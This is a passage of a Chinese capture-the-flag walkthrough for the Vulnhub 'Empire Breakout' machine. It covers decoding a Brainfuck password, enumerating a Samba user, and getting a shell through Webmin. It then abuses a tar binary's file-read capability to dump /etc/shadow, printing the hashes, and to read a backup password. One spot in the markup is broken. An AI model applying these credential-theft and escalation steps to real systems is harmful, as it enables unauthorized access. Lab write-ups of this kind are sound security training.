6#x3C;------------.\u003e\u003e---------.\u0026#x3C;\u0026#x3C;++++++.++++++.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这一长串的不知名的是什么玩意？Google了一下这是\u003ccode\u003eBrainfuck\u003c/code\u003e （一种编程语言），解释后是\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-number\"\u003e.2\u003c/span\u003euqPEfj3D\u0026#x3C;P\u003cspan class=\"hljs-string\"\u003e'a-3\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可能是一串明文密码\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描一下目录，就扫描出了\u003ccode\u003emanual\u003c/code\u003e目录，也就是文档目录，估计也不会藏东西\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e10000端口\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e指纹识别没识别出来，但是\u003ccode\u003eLOGO\u003c/code\u003e写的是\u003ccode\u003ewebmin\u003c/code\u003e，并且\u003ccode\u003enmap\u003c/code\u003e也扫描出了漏洞\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubEmpire%20Breakout/image66.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e因为之前得到了一串明文密码，我们可以用它来尝试枚举用户名，枚举了一下就被封\u003ccode\u003eip\u003c/code\u003e了（笑），目录扫描也不行\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尝试利用扫出来的漏洞\u003ccode\u003eCVE-2006-3392\u003c/code\u003e ，在\u003ccode\u003esearchexploit\u003c/code\u003e搜索了两个脚本，\u003ccode\u003epl\u003c/code\u003e的需要设置\u003ccode\u003essl\u003c/code\u003e 证书，\u003ccode\u003ephp\u003c/code\u003e的爆不出来，这条路也放弃了\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e因为目标服务器装了\u003ccode\u003esamba\u003c/code\u003e ，所以我们可以使用**\u003ccode\u003eEnum4linux\u003c/code\u003e** 工具来枚举信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e**Enum4linux \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.183\u003c/span\u003e\n//**\n[+] Enumerating users using SID S-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e logon username \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e, password \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e                                                                                                                                       \n                                                                                                                                                                                                                  \nS-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e Unix User\\cyber (Local User)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e枚举出一个用户\u003ccode\u003ecyber\u003c/code\u003e ，配合之前的得到的明文密码\u003ccode\u003e.2uqPEfj3D\u0026#x3C;P'a-3\u003c/code\u003e，可以尝试登陆一下\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e在\u003ccode\u003e10000\u003c/code\u003e 端口尝试密码错误，切换到\u003ccode\u003e20000\u003c/code\u003e端口尝试（\u003ccode\u003e20000\u003c/code\u003e端口也是相同登陆页面）登陆成功，进入后台\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e后台利用\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e进入后台，开始搜寻可利用的点\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubEmpire%20Breakout/image67.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e看到底下有一个我i们感兴趣的\u003ccode\u003eCommand shell\u003c/code\u003e ，点击后进入命令行了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubEmpire%20Breakout/image68.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e查看权限（这里的shell比反弹的好用，就没反弹）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e[cyber@breakout ~]$ whoami\ncyber\n[cyber@breakout ~]$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e(cyber) gid=\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e(cyber) groups=\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e(cyber),\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e(cdrom),\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e(floppy),\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e(audio),\u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e(dip),\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e(video),\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e(plugdev),\u003cspan class=\"hljs-number\"\u003e109\u003c/span\u003e(netdev)\n[cyber@breakout ~]$ uname -a\nLinux breakout \u003cspan class=\"hljs-number\"\u003e5.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e-amd64 \u003cspan class=\"hljs-comment\"\u003e#1 SMP Debian 5.10.70-1 (2021-09-30) x86_64 GNU/Linux\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e寻找敏感文件\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e当前家目录文件夹下存在\u003ccode\u003etar\u003c/code\u003e和\u003ccode\u003euser.txt\u003c/code\u003e 文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# user.txt\u003c/span\u003e\n[cyber@breakout ~]$ cat user.txt\n3mp!r3{You_Manage_To_Break_To_My_Secure_Access}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003etar\u003c/code\u003e是一个可执行文件，我们检测suid 和capability，通过**\u003ccode\u003egetcap\u003c/code\u003e\u003cstrong\u003e命令发现它有\u003c/strong\u003e\u003ccode\u003ecap_dac_read_search=ep\u003c/code\u003e**，因此它可以读取任意文件（利用该tar 打包再解压就可以查看没有权限查看的文件内容）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e[cyber@breakout ~]$ ls -al | grep tar\n-rwxr-xr-x  \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root  root  \u003cspan class=\"hljs-number\"\u003e531928\u003c/span\u003e Oct \u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2021\u003c/span\u003e tar\n[cyber@breakout ~]$ getcap tar\ntar cap_dac_read_search=ep\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e这样我们就可以使用\u003ccode\u003etar\u003c/code\u003e来读取隐私文件了\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e读取\u003ccode\u003eshadow\u003c/code\u003e文件，注意：使用\u003ccode\u003etar\u003c/code\u003e必须是家目录下的\u003ccode\u003etar\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e[cyber@breakout ~]$ ./tar -cvf shadow.tar /etc/shadow\n./tar: Removing leading `/\u003cspan class=\"hljs-string\"\u003e' from member names\n/etc/shadow\n[cyber@breakout ~]$ ./tar -xvf shadow.tar\netc/shadow\n[cyber@breakout ~]$ cat etc/shadow\nroot:$y$j9T$M3BDdkxYOlVM6ECoqwUFs.$Wyz40CNLlZCFN6Xltv9AAZAJY5S3aDvLXp0tmJKlk6A:18919:0:99999:7:::\ndaemon:*:18919:0:99999:7:::\nbin:*:18919:0:99999:7:::\nsys:*:18919:0:99999:7:::\nsync:*:18919:0:99999:7:::\ngames:*:18919:0:99999:7:::\nman:*:18919:0:99999:7:::\nlp:*:18919:0:99999:7:::\nmail:*:18919:0:99999:7:::\nnews:*:18919:0:99999:7:::\nuucp:*:18919:0:99999:7:::\nproxy:*:18919:0:99999:7:::\nwww-data:*:18919:0:99999:7:::\nbackup:*:18919:0:99999:7:::\nlist:*:18919:0:99999:7:::\nirc:*:18919:0:99999:7:::\ngnats:*:18919:0:99999:7:::\nnobody:*:18919:0:99999:7:::\n_apt:*:18919:0:99999:7:::\nsystemd-timesync:*:18919:0:99999:7:::\nsystemd-network:*:18919:0:99999:7:::\nsystemd-resolve:*:18919:0:99999:7:::\nmessagebus:*:18919:0:99999:7:::\ncyber:$y$j9T$x6sDj5S/H0RH4IGhi0c6x0$mIPyCIactTA3/gxTaI7zctfCt2.EOGXTOW4X9efAVW4:18919:0:99999:7:::\nsystemd-coredump:!*:18919::::::\n\u003c/span\u003e\u003c/code\u003e\u003 ds\nProceeding \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e single, rules:Single\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e Ctrl-C to abort, almost \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\nAlmost done: Processing the remaining buffered candidate passwords, \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e.\nProceeding \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e wordlist:/usr/share/john/password.lst\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e破解了很久没爆出来\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e我们接着寻找敏感文件\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e在 \u003ccode\u003e/var/backups\u003c/code\u003e 下存在 \u003ccode\u003e.old_pass.bak\u003c/code\u003e ,我们使用上面步骤查看文件内容\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e[cyber@breakout ~]$ ./tar -cvf old_pass.tar /var/backups/.old_pass.bak\n./tar: Removing leading `/\u003cspan class=\"hljs-string\"\u003e' from member names\n/var/backups/.old_pass.bak\n[cyber@breakout ~]$ ./tar -xvf old_pass.tar\nvar/backups/.old_pass.bak\n[cyber@breakout ~]$ cat var/backups/.old_pass.bak\nTs\u0026#x26;4\u0026#x26;YurgtRX(=~h\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到一串明文\u003ccode\u003eTs\u0026#x26;4\u0026#x26;YurgtRX(=~h\u003c/code\u003e ，可能是密码\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e我们可以尝试一下\u003ccode\u003eroot\u003c/code\u003e账号使用上面得到的明文登录\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e在网页上的命令行是不行，我们进行反弹\u003ccode\u003eshell\u003c/code\u003e ，同时\u003ccode\u003ekali\u003c/code\u003e开启监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# kali
